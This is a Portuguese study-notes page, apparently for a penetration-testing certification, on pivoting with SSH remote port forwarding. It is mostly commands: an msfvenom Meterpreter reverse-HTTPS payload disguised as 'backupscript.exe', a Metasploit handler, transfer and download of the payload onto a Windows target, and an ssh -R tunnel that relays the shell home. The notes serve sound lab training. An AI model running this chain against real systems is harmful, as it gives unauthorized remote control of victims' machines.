> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/pivoting-tunneling-and-port-forwarding/remote-reverse-port-forwarding-with-ssh.md).

# Remote/Reverse Port Forwarding with SSH

Como pode ser visto na imagem abaixo, em nosso caso anterior, poderíamos fazer pivot no host Windows por meio do servidor Ubuntu.

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FMrkBLn1ycAqYzEu8zSFb%2Fimage.png?alt=media&amp;token=18ad2da2-6c1e-434f-a8af-7e7603cf8972" alt=""><figcaption></figcaption></figure>

* **Criando um Payload do Windows com msfvenom**

```sh
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

* **Configurando e iniciando o multi/handler**

{% code lineNumbers="true" %}

```sh
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

{% endcode %}

* **Transferindo carga útil para o host Pivot**

```sh
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

* **Iniciando o servidor Web Python3 no Pivot Host**

```sh
python3 -m http.server 8123
```

* **Baixando Payload do Windows Target**

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

***

### **Usando SSH -R**

```sh
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

* Após criar o encaminhamento de porta remota SSH, podemos executar o payload do alvo do Windows. Se o payload for executado conforme o esperado e tentar se conectar de volta ao nosso listener, podemos ver os logs do pivot no host do pivot.
* Se tudo estiver configurado corretamente, receberemos um shell do Meterpreter dinamizado pelo servidor Ubuntu.
